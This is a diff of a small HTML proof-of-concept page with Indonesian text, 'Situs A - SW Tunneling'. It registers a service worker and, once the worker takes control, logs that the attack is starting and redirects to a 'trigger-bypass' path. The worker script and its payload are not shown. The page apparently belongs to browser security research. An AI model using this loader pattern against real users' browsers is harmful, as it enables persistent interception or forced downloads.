@@ -2,20 +2,26 @@
 <html>
 
 <head>
-    <title>PoC Rombak - Auto Download</title>
+    <title>Situs A - SW Tunneling</title>
 </head>
 
 <body>
-    <h3>Situs A (Automated Attack)</h3>
-    <p>Menunggu trigger otomatis...</p>
+    <h3>Situs A (SW Tunneling)</h3>
+    <p>Menyiapkan Service Worker...</p>
 
     <script>
-        navigator.serviceWorker.register('sw.js').then(reg => {
-            console.log("Service Worker Registered!");
-            setTimeout(() => {
-                window.location.href = '/trigger-bypass';
-            }, 2000);
-        });
+        if ('serviceWorker' in navigator) {
+            navigator.serviceWorker.register('sw.js').then(reg => {
+                console.log("SW Registered dalam scope:", reg.scope);
+            }).catch(err => {
+                console.error("SW Gagal daftar:", err);
+            });
+
+            navigator.serviceWorker.addEventListener('controllerchange', () => {
+                console.log("SW sudah memegang kendali penuh! Memulai serangan...");
+                window.location.href = 'trigger-bypass';
+            });
+        }
     </script>
 </body>
 
